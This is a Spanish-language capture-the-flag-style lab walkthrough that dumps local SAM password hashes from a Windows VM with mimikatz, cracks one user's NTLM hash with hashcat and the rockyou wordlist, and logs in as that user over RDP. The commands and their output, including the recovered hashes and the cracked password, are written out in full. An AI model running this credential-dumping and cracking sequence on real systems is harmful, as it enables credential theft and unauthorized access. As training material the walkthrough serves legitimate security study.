# Walk: Password Attacks - Cracking NTLM - VM #1

## Fecha: 24/02/2025
## Host: Windows
## IP: 192.168.155.210
## Objetivo
Follow the steps outlined in this section and find the flag on the _nelly_ user's desktop on VM #1 (MARKETINGWK01).
## Herramientas
1. xfreerdp
2. hashcat
3. mimikatz
## Procedimiento y comandos
#### Paso 1: Obtenemos el hash de nelly de SAM
> _"los hashes NTLM se almacenan en la base de datos SAM"_
- Sabiendo esto y conectado a offsec/lab por **rdp** obtenemos desde este usuario el hash de _**nelly**_
1. Determinamos los usuarios existentes en el sisitema:
`Get-LocalUser`
```
Name Enabled Description
---- ------- -----------
Administrator False Built-in account for administering the computer/domain
DefaultAccount False A user account managed by the system.
Guest False Built-in account for guest access to the computer/domain
nelly True
offsec True
WDAGUtilityAccount False A user account managed and used by the system for Windows Defender Application Guard scen...
```
2. Ejecutamos mimikatz:
```
PS C:\Windows\system32> cd C:\tools
PS C:\tools> ls
Directory: C:\tools
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 5/31/2022 12:25 PM 1355680 mimikatz.exe
PS C:\tools> .\mimikatz.exe
.#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```
3. Obtenemos el hash elevando nuestros privilegios a **System**
	- `privilege::debug` habilitamos _**SeDebugPrivilege**_ para poder ejecutar el resto de los comandos.
	- `token::elevate` eleva nuestros privilegios a _system_ para poder obtener el hash.
	- `lsadump::sam` extrae las passwords de SAM.
```
mimikatz #  privilege::debug
Privilege '20' OK
mimikatz #  token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-4264639230-2296035194-3358247000-1001 (14g,24p) Primary
* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation)
mimikatz #  lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
RID : 000003e9 (1001)
User : offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
RID : 000003ea (1002)
User : nelly
Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
...
```
#### Paso 2: Creckeamos el hash
- Una vez obtenido el hash _**3ae8e5f0ffabb3a627672e1600f1ba10**_ procedemos a crackearlo en kali.
1. Guardamos el hash: `echo "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash`
2. Averiguamos el modo: `hashcat -h | grep "ntlm"`
```
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
3. Ejecutamos **hashcat** para crackear el hash:
`hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Mon Feb 24 13:22:39 2025, (1 sec)
Time.Estimated...: Mon Feb 24 13:22:40 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3814.9 kH/s (6.06ms) @ Accel:128 Loops:77 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 78848/1104517645 (0.01%)
Rejected.........: 0/78848 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bnybny
Hardware.Mon.#1..: Temp: 61c Util: 14%
```
#### Paso 3: Obtenemos el hash:
1. Nos conectamos al usuario de nelly con sus credenciales por **rdp**
`xfreerdp /v:192.168.155.210 /u:nelly /p:nicole1 +clipboard /cert:ignore `
